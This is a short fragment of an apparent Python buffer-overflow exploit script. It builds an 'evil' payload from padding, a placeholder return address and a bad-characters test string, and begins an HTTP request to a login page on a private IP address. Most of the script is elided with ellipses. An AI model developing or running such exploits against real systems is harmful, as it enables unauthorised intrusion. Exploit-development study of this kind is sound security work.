...
#The Badchars That We Might See In The Program
...
evil = b"A" * offset + b"B" * 4 + badchars
...
try:
    ...
    req += b"Origin: http://192.168.2.28\r\n"
    req += b"Connection: close\r\n"
    req += b"Referer: http://192.168.2.28/login\r\n"
